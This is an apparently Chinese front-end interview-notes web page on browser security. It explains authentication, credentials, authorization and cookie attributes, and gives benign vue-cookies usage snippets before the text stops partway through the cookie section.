  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li><li class="dropdown-item"><h4>
          在线服务
        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="https://www.aliyun.com/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  阿里云
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-subitem"><a href="https://cloud.tencent.com/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  腾讯云
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li><li class="dropdown-item"><h4>
          博客指南
        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="https://juejin.im/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  掘金
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-subitem"><a href="https://blog.csdn.net/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  CSDN
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-subitem"><a href="https://v3.cn.vuejs.org/guide/introduction.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Vue3
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-subitem"><a href="https://cn.vuejs.org/v2/guide/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Vue2
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li></ul></div></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>面经</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/docs/面经/腾讯面经/HTML.html" class="sidebar-link">HTML</a></li><li><a href="/docs/面经/腾讯面经/CSS.html" class="sidebar-link">CSS</a></li><li><a href="/docs/面经/腾讯面经/JS.html" class="sidebar-link">JS</a></li><li><a href="/docs/面经/腾讯面经/TS.html" class="sidebar-link">TS</a></li><li><a href="/docs/面经/腾讯面经/node.html" class="sidebar-link">node</a></li><li><a href="/docs/面经/腾讯面经/Vue.html" class="sidebar-link">Vue2 基础</a></li><li><a href="/docs/面经/腾讯面经/React.html" class="sidebar-link">React</a></li><li><a href="/docs/面经/腾讯面经/Webpack&amp;Vite.html" class="sidebar-link">Webpack</a></li><li><a href="/docs/面经/腾讯面经/操作系统.html" class="sidebar-link">操作系统</a></li><li><a href="/docs/面经/腾讯面经/后端问题.html" class="sidebar-link">后端问题</a></li><li><a href="/docs/面经/腾讯面经/计算机网络.html" class="sidebar-link">计算机网络</a></li><li><a href="/docs/面经/腾讯面经/浏览器安全.html" class="active sidebar-link">浏览器安全</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#重点-基石-cookie、session、token、jwt" class="sidebar-link">（重点）基石 Cookie、Session、Token、JWT</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#什么是认证-authentication" class="sidebar-link">什么是认证（Authentication）</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#什么是凭证-credentials" class="sidebar-link">什么是凭证（Credentials）</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#什么是授权-authorization" class="sidebar-link">什么是授权（Authorization）</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#什么是-cookie" class="sidebar-link">什么是 Cookie</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#什么是-session" class="sidebar-link">什么是 Session</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#cookie-和-session-的区别" class="sidebar-link">Cookie 和 Session 的区别</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#什么是-token-令牌" class="sidebar-link">什么是 Token（令牌）</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#token-和-session-的区别" class="sidebar-link">Token 和 Session 的区别</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#什么是-jwt" class="sidebar-link">什么是 JWT</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#token-和-jwt-的区别" class="sidebar-link">Token 和 JWT 的区别</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#常见的前后端鉴权方式" class="sidebar-link">常见的前后端鉴权方式</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#常见的加密算法" class="sidebar-link">常见的加密算法</a></li></ul></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#常见问题" class="sidebar-link">常见问题</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#使用-cookie-时需要考虑的问题" class="sidebar-link">使用 cookie 时需要考虑的问题</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#使用-session-时需要考虑的问题" class="sidebar-link">使用 session 时需要考虑的问题</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#使用-token-时需要考虑的问题" class="sidebar-link">使用 token 时需要考虑的问题</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#使用-jwt-时需要考虑的问题" class="sidebar-link">使用 JWT 时需要考虑的问题</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#使用加密算法时需要考虑的问题" class="sidebar-link">使用加密算法时需要考虑的问题</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#分布式架构下-session-共享方案" class="sidebar-link">分布式架构下 session 共享方案</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#只要关闭浏览器-session-真的就消失了" class="sidebar-link">只要关闭浏览器 ，session 真的就消失了？</a></li></ul></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#_1-重点-xss" class="sidebar-link">1 重点：XSS</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#重点-什么是xss" class="sidebar-link">(重点)什么是XSS</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#xss-分类" class="sidebar-link">XSS 分类</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#xss攻击的预防" class="sidebar-link">XSS攻击的预防</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#最优xss-防范措施" class="sidebar-link">最优XSS 防范措施</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#xss-的检测" class="sidebar-link">XSS 的检测</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#xss攻击的介绍" class="sidebar-link">XSS攻击的介绍</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#漏洞总结" class="sidebar-link">漏洞总结</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#xss-攻击案例" class="sidebar-link">XSS 攻击案例</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#课后作业-xss-攻击小游戏" class="sidebar-link">课后作业：XSS 攻击小游戏</a></li></ul></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#_2-重点-知道哪些前端危险-如何防御" class="sidebar-link">2 （重点）知道哪些前端危险？如何防御</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#_3-xss的原理-如何防御xss-为什么换成实体字符就好了" class="sidebar-link">3 XSS的原理，如何防御XSS？为什么换成实体字符就好了？</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#_4-假如说某链接获取到你的敏感信息-发送奇怪请求到服务器-你怎么去防御-反射型xss防御" class="sidebar-link">4 假如说某链接获取到你的敏感信息，发送奇怪请求到服务器，你怎么去防御？(反射型XSS防御)</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#_5-讲一讲cookie是怎么发送到服务端-具体过程-尽量详细" class="sidebar-link">5 讲一讲cookie是怎么发送到服务端，具体过程，尽量详细</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#_6-重点-csrf攻击" class="sidebar-link">6 重点：CSRF攻击</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#重点-什么是csrf" class="sidebar-link">(重点)什么是CSRF</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#几种常见的攻击类型" class="sidebar-link">几种常见的攻击类型</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#csrf的特点" class="sidebar-link">CSRF的特点</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#防护策略" class="sidebar-link">防护策略</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#同源检测" class="sidebar-link">同源检测</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#csrf-token" class="sidebar-link">CSRF Token</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#分布式校验" class="sidebar-link">分布式校验</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#encrypted-token-pattern" class="sidebar-link">Encrypted Token Pattern</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#双重cookie验证" class="sidebar-link">双重Cookie验证</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#samesitecookie属性" class="sidebar-link"></a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#防止网站被利用" class="sidebar-link">防止网站被利用</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#csrf其他防范措施" class="sidebar-link">CSRF其他防范措施</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#csrf测试" class="sidebar-link">CSRF测试</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#csrf监控" class="sidebar-link">CSRF监控</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#个人用户csrf安全的建议" class="sidebar-link">个人用户CSRF安全的建议</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#总结-3" class="sidebar-link">总结</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#历史案例" class="sidebar-link">历史案例</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#wordpress的csrf漏洞" class="sidebar-link">WordPress的CSRF漏洞</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#youtube的csrf漏洞" class="sidebar-link">YouTube的CSRF漏洞</a></li></ul></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#_8-黑客是怎么去利用cookie的-这个请求到底是怎么构造的" class="sidebar-link">8 黑客是怎么去利用cookie的？这个请求到底是怎么构造的？</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#_9-http请求中option主要是干什么的" class="sidebar-link">9 http请求中option主要是干什么的</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#_10-xss的原理和防御措施-讲了加强cookie-过滤输入-过滤输出" class="sidebar-link">10 xss的原理和防御措施（讲了加强cookie，过滤输入，过滤输出）</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#_11-csrf了解过吗-它的攻击流程是怎样的-如何防御-referer可不可以被修改、token可不可以被窃取-既然有漏洞那不是白做了" class="sidebar-link">11 CSRF了解过吗，它的攻击流程是怎样的，如何防御（referer可不可以被修改、token可不可以被窃取，既然有漏洞那不是白做了）</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#什么是csrf" class="sidebar-link">什么是CSRF</a></li></ul></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#_12-关于token前后端传递以及涉及到的cookie跨域问题" class="sidebar-link">12 关于Token前后端传递以及涉及到的cookie跨域问题</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#服务端端返回" class="sidebar-link">服务端端返回</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#前端携带" class="sidebar-link">前端携带</a></li></ul></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#_13-csrf-token能存储在cookie里吗" class="sidebar-link">13 csrf token能存储在cookie里吗？</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#_14-sessionstorage-与-localstorage-有何区别" class="sidebar-link">14 sessionStorage 与 localStorage 有何区别</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#_15-重点-前端攻击-点击劫持" class="sidebar-link">15(重点)前端攻击：点击劫持</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#_16-重点-ddos" class="sidebar-link">16 （重点）DDoS</a></li><li class="sidebar-sub-header"><a href="/docs/面经/腾讯面经/浏览器安全.html#_17-重点-sql注入" class="sidebar-link">17 （重点）SQL注入</a></li></ul></li><li><a href="/docs/面经/腾讯面经/浏览器工作原理.html" class="sidebar-link">浏览器工作原理</a></li><li><a href="/docs/面经/腾讯面经/前端框架.html" class="sidebar-link">前端框架</a></li><li><a href="/docs/面经/腾讯面经/设计模式.html" class="sidebar-link">设计模式</a></li><li><a href="/docs/面经/腾讯面经/手撕.html" class="sidebar-link">手撕</a></li><li><a href="/docs/面经/腾讯面经/算法.html" class="sidebar-link">算法</a></li><li><a href="/docs/面经/腾讯面经/项目工程.html" class="sidebar-link">项目工程</a></li><li><a href="/docs/面经/腾讯面经/移动端&amp;小程序.html" class="sidebar-link">移动端&amp;小程序</a></li><li><a href="/docs/面经/腾讯面经/桌面应用.html" class="sidebar-link">(重点)electron原理</a></li><li><a href="/docs/面经/腾讯面经/简历问题.html" class="sidebar-link">简历问题</a></li><li><a href="/docs/面经/腾讯面经/开发环境.html" class="sidebar-link">开发环境</a></li><li><a href="/docs/面经/腾讯面经/扩展问题.html" class="sidebar-link">扩展问题</a></li><li><a href="/docs/面经/腾讯面经/面试记录.html" class="sidebar-link">自我介绍</a></li></ul></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="浏览器安全"><a href="#浏览器安全" class="header-anchor">#</a> 浏览器安全</h1> <h2 id="重点-基石-cookie、session、token、jwt"><a href="#重点-基石-cookie、session、token、jwt" class="header-anchor">#</a> （重点）基石 Cookie、Session、Token、JWT</h2> <h3 id="什么是认证-authentication"><a href="#什么是认证-authentication" class="header-anchor">#</a> 什么是认证（Authentication）</h3> <ul><li>通俗地讲就是<strong>验证当前用户的身份</strong>，证明“你是你自己”（比如：你每天上下班打卡，都需要通过指纹打卡，当你的指纹和系统里录入的指纹相匹配时，就打卡成功）</li> <li>互联网中的认证：
<ul><li>用户名密码登录</li> <li>邮箱发送登录链接</li> <li>手机号接收验证码</li> <li>只要你能收到邮箱/验证码，就默认你是账号的主人</li></ul></li></ul> <h3 id="什么是凭证-credentials"><a href="#什么是凭证-credentials" class="header-anchor">#</a> 什么是凭证（Credentials）</h3> <ul><li><p>实现认证和授权的前提</p> <p>是需要一种</p> <p>媒介（证书）</p> <p>来标记访问者的身份</p> <ul><li>在战国时期，商鞅变法，发明了照身帖。照身帖由官府发放，是一块打磨光滑细密的竹板，上面刻有持有人的头像和籍贯信息。国人必须持有，如若没有就被认为是黑户，或者间谍之类的。</li> <li>在现实生活中，每个人都会有一张专属的<a href="https://link.juejin.cn?target=https%3A%2F%2Fbaike.baidu.com%2Fitem%2F%E5%B1%85%E6%B0%91%E8%BA%AB%E4%BB%BD%E8%AF%81%2F2080960" target="_blank" rel="noopener noreferrer">居民身份证<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>，是用于证明持有人身份的一种法定<a href="https://link.juejin.cn?target=https%3A%2F%2Fbaike.baidu.com%2Fitem%2F%E8%AF%81%E4%BB%B6%2F5804999" target="_blank" rel="noopener noreferrer">证件<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>。通过身份证，我们可以办理手机卡/银行卡/个人贷款/交通出行等等，这就是<strong>认证的凭证。</strong></li> <li>在互联网应用中，一般网站（如掘金）会有两种模式，游客模式和登录模式。游客模式下，可以正常浏览网站上面的文章，一旦想要点赞/收藏/分享文章，就需要登录或者注册账号。当用户登录成功后，<font color="red" size="3">服务器会给该用户使用的浏览器颁发一个令牌（token）</font>，这个令牌用来表明你的身份，每次浏览器发送请求时会带上这个令牌，就可以使用游客模式下无法使用的功能。</li></ul></li></ul> <h3 id="什么是授权-authorization"><a href="#什么是授权-authorization" class="header-anchor">#</a> 什么是授权（Authorization）</h3> <ul><li>用户授予第三方应用访问该用户某些资源的权限
<ul><li>你在安装手机应用的时候，APP 会询问是否允许授予权限（访问相册、地理位置等权限）</li> <li>你在访问微信小程序时，当登录时，小程序会询问是否允许授予权限（获取昵称、头像、地区、性别等个人信息）</li></ul></li> <li>实现授权的方式有：cookie、session、token、OAuth</li></ul> <h3 id="什么是-cookie"><a href="#什么是-cookie" class="header-anchor">#</a> 什么是 Cookie</h3> <ul><li><strong>HTTP 是无状态的协议（对于事务处理没有记忆能力，每次客户端和服务端会话完成时，服务端不会保存任何会话信息</strong>）：每个请求都是完全独立的，服务端无法确认当前访问者的身份信息，无法分辨上一次的请求发送者和这一次的发送者是不是同一个人。所以服务器与浏览器为了进行会话跟踪（知道是谁在访问我），就必须主动的去维护一个状态，这个状态用于告知服务端前后两个请求是否来自同一浏览器。而这个状态需要通过 cookie 或者 session 去实现。</li> <li><strong>cookie 存储在客户端：</strong> cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。</li> <li><strong>cookie 是不可跨域的：</strong> 每个 cookie 都会绑定单一的域名，无法在别的域名下获取使用，<strong>一级域名和二级域名之间是允许共享使用的</strong>（<strong>靠的是 domain）</strong>。</li></ul> <p><strong>cookie 重要的属性</strong></p> <table><thead><tr><th>属性</th> <th>说明</th></tr></thead> <tbody><tr><td><strong>name=value</strong></td> <td>键值对，设置 Cookie 的名称及相对应的值，都必须是<strong>字符串类型</strong> - 如果值为 Unicode 字符，需要为字符编码。 - 如果值为二进制数据，则需要使用 BASE64 编码。</td></tr> <tr><td><strong>domain</strong></td> <td>指定 cookie 所属域名，默认是当前域名</td></tr> <tr><td><strong>path</strong></td> <td><strong>指定 cookie 在哪个路径（路由）下生效，默认是 '/'</strong>。 如果设置为 <code>/abc</code>，则只有 <code>/abc</code> 下的路由可以访问到该 cookie，如：<code>/abc/read</code>。</td></tr> <tr><td><strong>maxAge</strong></td> <td>cookie 失效的时间，单位秒。如果为整数，则该 cookie 在 maxAge 秒后失效。如果为负数，该 cookie 为临时 cookie ，关闭浏览器即失效，浏览器也不会以任何形式保存该 cookie 。如果为 0，表示删除该 cookie 。默认为 -1。 - <strong>比 expires 好用</strong>。</td></tr> <tr><td><strong>expires</strong></td> <td>过期时间，在设置的某个时间点后该 cookie 就会失效。 一般浏览器的 cookie 都是默认储存的，当关闭浏览器结束这个会话的时候，这个 cookie 也就会被删除</td></tr> <tr><td><strong>secure</strong></td> <td>该 cookie 是否仅被使用安全协议传输。安全协议有 HTTPS，SSL等，在网络上传输数据之前先将数据加密。默认为false。 当 secure 值为 true 时，cookie 在 HTTP 中是无效，在 HTTPS 中才有效。</td></tr> <tr><td><strong>httpOnly</strong></td> <td><strong>如果给某个 cookie 设置了 httpOnly 属性，则无法通过 JS 脚本 读取到该 cookie 的信息，但还是能通过 Application 中手动修改 cookie，所以只是在一定程度上可以防止 XSS 攻击，不是绝对的安全</strong></td></tr></tbody></table> <h4 id="vue设置cookie并发送给后端"><a href="#vue设置cookie并发送给后端" class="header-anchor">#</a> vue设置cookie并发送给后端</h4> <h4 id="设置cookie"><a href="#设置cookie" class="header-anchor">#</a> 设置cookie</h4> <ol><li>安装vue-cookies</li></ol> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>npm i vue<span class="token operator">-</span>cookies <span class="token operator">--</span>save
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ol start="2"><li>引入vue-cookies</li></ol> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">import</span> VueCookies <span class="token keyword">from</span> <span class="token string">'vue-cookies'</span><span class="token punctuation">;</span>
Vue<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>VueCookies<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><ol start="3"><li><p>Api</p> <p>设置一个cookie</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">this</span><span class="token punctuation">.</span>$cookies<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">&quot;token&quot;</span><span class="token punctuation">,</span> value1<span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token literal-property property">expires</span><span class="token operator">:</span> <span class="token string">&quot;7D&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// keyName =&gt; &quot;token&quot;</span>
  <span class="token comment">// value =&gt;  value1</span>
  <span class="token comment">// 设置过期时间 = &gt; {expires: &quot;7D&quot;}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/KeXiaoZhan/Images/20210610161059297.png" alt="在这里插入图片描述"></p></li></ol> <p>获取一个cookie</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">this</span><span class="token punctuation">.</span>$cookies<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>keyName<span class="token punctuation">)</span>       <span class="token comment">// return value  </span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>删除一个cookie</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">this</span><span class="token punctuation">.</span>$cookies<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>keyName <span class="token punctuation">[</span><span class="token punctuation">,</span> path <span class="token punctuation">[</span><span class="token punctuation">,</span> domain<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token comment">// return this</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>检查某个 cookie name是否存在</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">this</span><span class="token punctuation">.</span>$cookies<span class="token punctuation">.</span><span class="token function">isKey</span><span class="token punctuation">(</span>keyName<span class="token punctuation">)</span>        <span class="token comment">// return false or true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>获取所有 cookie name，以数组形式返回</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">this</span><span class="token punctuation">.</span>$cookies<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">// return a array</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>设置cookie过期时间</p> <p>全局设置</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 30天后过期</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$cookies<span class="token punctuation">.</span><span class="token function">config</span><span class="token punctuation">(</span><span class="token string">'30d'</span><span class="token punctuation">)</span>

